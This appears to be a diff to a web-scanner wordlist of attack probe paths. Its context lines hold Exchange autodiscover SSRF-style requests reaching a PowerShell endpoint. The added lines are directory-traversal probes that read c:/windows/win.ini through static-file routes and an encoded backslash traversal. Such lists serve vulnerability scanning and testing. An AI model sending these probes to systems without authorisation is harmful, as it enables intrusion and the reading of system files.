@@ -7,3 +7,8 @@
 /autodiscover/autodiscover.json?aa@{{Host}}/owa/?&Email=aa@autodiscover/autodiscover.json?a@{{Host}}&Protocol=Autodiscoverv1&{{Host}}Protocol=Powershell
 /autodiscover/autodiscover.json/v1.0/aa@autodiscover/autodiscover.json?a..@{{Host}}&Protocol=Autodiscoverv1&Protocol=Powershell
 /autodiscover/autodiscover.json?@{{Host}}/&Email=autodiscover/autodiscover.json%3f@{{Host}}
+/base_import/static/c:/windows/win.ini
+/web/static/c:/windows/win.ini
+/base/static/c:/windows/win.ini
+/ReportServer/Pages/ReportViewer.aspx
+/mgmnt/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
